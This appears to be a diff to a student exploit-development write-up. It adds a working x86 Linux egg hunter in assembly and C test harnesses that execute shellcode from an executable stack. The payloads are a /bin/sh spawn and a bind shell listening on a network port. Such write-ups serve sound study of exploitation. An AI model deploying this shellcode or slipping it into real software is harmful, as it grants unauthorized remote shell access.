@@ -41,41 +41,128 @@ The egg hunter code is divided in four major parts:
 
 The egg hunter shellcode:
 ```nasm
-insert egg hunter assembly code here
+global _start
+
+;FIRST PART
+_start:
+	xor ecx, ecx 			;Initialize ecx to NULL
+	mul ecx				;Initilize eax and edx to NULL
+
+;SECOND PART
+_firstStep:
+	or dx, 0xfff			;Do a OR on dx register, dx == 0xFFF
+
+_secondStep:
+	inc edx				;Add 1 to edx, edx == 0x1000
+
+    ;THIRD PART
+	lea ebx, [edx+0x4]		;ebx now holds the value of edx + 0x4
+	push byte +0x21			;Push 0x21 on the stack
+	pop eax				;Pop 0x21 which is the systemcall value of access
+	int 0x80			;Go for it
+	cmp al, 0xf2			;Compare the systemcall return value to 0x2f
+	jz _firstStep			;If zero, the program will jump to '_firstStep'. Which means the return value is not a valid memory address
+
+    ;FOURTH PART
+	mov eax, 0x50905090		;This instruction will move our egg value inside eax
+	mov edi, edx			;Move the address stores in edx to edi
+	scasd				;This instruction will compare the value inside eax and edi
+	jnz _secondStep			;Jump back to '_secondStep' if the comparaison is false
+	scasd				;We check a second time the presence of our egg before executing the shellcode
+	jnz _secondStep			;Jump back to '_secondStep' if the comparaison is false
+	jmp edi				;Jump to our payload
 ```
 
-The C code used to test our egg hunter shellcode:
+Let's compile it:
+```console
+#nasm -f elf32 -o egg_hunter.o egg_hunter.nasm
+#ld -m elf_i386 -z execstack -o egg_hunter egg_hunter.o
+```
+
+We can obtain the hexadecimal representation of the previous code by using the following command:
+```console
+#objdump -d ./egg_hunter |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+```
+
+The following C code is used to test our egg hunter:
 ```c
+#include <stdio.h>
+#include <string.h>
+
+// egg_hunter.nasm shellcode is stored here
+unsigned char egg_hunter[] = \
+"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";
+
+unsigned char shellcode[] = \
+"\x90\x50\x90\x50" // first egg
+"\x90\x50\x90\x50" // second egg
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80";
+
+void main()
+{
+	// print the length of the shellcodes
+	printf("Egg hunter shellcode Length:  %d\n", strlen(egg_hunter));
+	printf("Egg shellcode Length:  %d\n", strlen(shellcode));
+
+	// convert shellcode to a function
+	int (*ret)() = (int(*)())egg_hunter;
+	// execute the shellcode has a function
+	ret();
+
+}
 ```
 
 Let's compile it and execute it:
 ```console
+#gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack 
+#./test_shellcode
 ```
 
 ## Step 3: make the egg hunter easily configurable for different payloads
-The following C code can be used to configure different payloads and load them in memory using the egg hunter shellcode.
+For this part, we will use the bind_shell.nasm code from the assignment#1.
+
+We first need to compile it:
+```console
+#nasm -f elf32 -o bind_shell.o bind_shell.nasm
+#ld -m elf_i386 -z execstack -o bind_shell bind_shell.o
+```
+
+We can obtain the hexadecimal representation of the previous code by using the following command:
+```console
+#objdump -d ./bind_shell |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+```
+
+We will use exactly the same C code has shown before to test a different payload. In this case our bind shell.
 ```c
-Insert C code here
+#include <stdio.h>
+#include <string.h>
+
+// egg_hunter.nasm shellcode is stored here
+unsigned char egg_hunter[] = \
+"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";
+
+// the bind shell code is stored inside this variable precede by two eggs
+unsigned char shellcode[] = \
+"\x90\x50\x90\x50" // first egg
+"\x90\x50\x90\x50" // second egg
+"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x50\x66\x68\x11\x5c\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80";
+
+void main()
+{
+	// print the length of the shellcodes
+	printf("Egg hunter shellcode Length:  %d\n", strlen(egg_hunter));
+	printf("Egg shellcode Length:  %d\n", strlen(shellcode));
+
+	// convert shellcode to a function
+	int (*ret)() = (int(*)())egg_hunter;
+	// execute the shellcode has a function
+	ret();
+
+}
 ```
 
 Let's compile the code and execute it:
 ```console
-insert compile commands here
-```
-
-## Bonus:
-During my work, I found another way to create an egg hunter using far less code.
-Here is a different version of the previous code:
-```nasm
-insert new version egg hunter assembly code
-```
-
-Here is the C code used to test the previous assembly code:
-```c
-insert C code used to test the previous assembly code
-```
-
-Let's compile it and execute it:
-```console
-insert bash commands
+#gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack 
+#./test_shellcode
 ```
